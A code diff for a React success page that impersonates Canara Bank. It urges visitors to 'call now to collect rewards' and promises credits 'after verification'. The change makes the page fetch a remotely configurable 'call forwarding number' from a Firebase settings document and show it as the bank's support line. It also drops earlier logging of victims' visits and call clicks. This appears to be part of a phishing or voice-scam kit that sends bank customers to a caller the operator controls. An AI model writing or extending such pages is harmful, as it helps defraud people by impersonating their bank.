@@ -1,41 +1,23 @@
-import { useEffect } from 'react';
+import { useState, useEffect } from 'react';
 import FirebaseUtil from '../FirebaseRepo';
 import '../App.css';
 
 const SuccessPage = () => {
-  const callNumber = '9876543210';
+  const [callNumber, setCallNumber] = useState('1800-123-4567');
 
   useEffect(() => {
-    // Record visit to success page in Firebase
-    const logSuccessPageVisit = async () => {
+    const fetchCallNumber = async () => {
       try {
-        await FirebaseUtil.uploadAnyModel("canara_bank_success", {
-          page: "success_page",
-          timestamp: new Date().toISOString()
-        });
+        const doc = await FirebaseUtil.getDocument("carvana_settings", "forwarding_numbers");
+        if (doc?.call_forwarding_number && typeof doc.call_forwarding_number === 'string') {
+          setCallNumber(doc.call_forwarding_number.trim());
+        }
       } catch (error) {
-        console.error("Error logging success page visit:", error);
+        console.error("Error fetching call number:", error);
       }
     };
-
-    logSuccessPageVisit();
+    fetchCallNumber();
   }, []);
-
-  const handleCallButtonClick = async () => {
-    try {
-      // Log the call button click
-      await FirebaseUtil.uploadAnyModel("canara_bank_calls", {
-        callNumber,
-        action: "call_button_clicked",
-        timestamp: new Date().toISOString()
-      });
-      
-      // Open the phone dialer
-      window.open(`tel:${callNumber}`, '_self');
-    } catch (error) {
-      console.error("Error logging call button click:", error);
-    }
-  };
 
   return (
     <div className="flex flex-col min-h-screen bg-white">
@@ -96,12 +78,18 @@ const SuccessPage = () => {
           </div>
 
           <button
-            onClick={handleCallButtonClick}
             className="w-full bg-yellow-400 hover:bg-yellow-500 text-black font-bold py-2 px-4 rounded-full text-sm mb-4"
           >
             CALL NOW TO COLLECT REWARDS
           </button>
-          
+
+          <button
+            className="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-2 px-4 rounded-full"
+            onClick={() => window.location.reload()}
+          >
+            Back to Home
+          </button>
+
           <p className="text-xs text-gray-500 text-center">
             Your rewards will be credited to your account within 24-48 hours after verification.
           </p>
@@ -111,7 +99,7 @@ const SuccessPage = () => {
       {/* Bottom Part / Footer */}
       <footer className="bg-gray-800 text-white p-4 text-center">
         <p className="text-sm"> 2025 Canara Bank. All rights reserved.</p>
-        <p className="text-xs">For support, call 1800-123-4567 or email support@canarabank.com</p>
+        <p className="text-xs">For support, call {callNumber} or email support@canarabank.com</p>
       </footer>
     </div>
   );
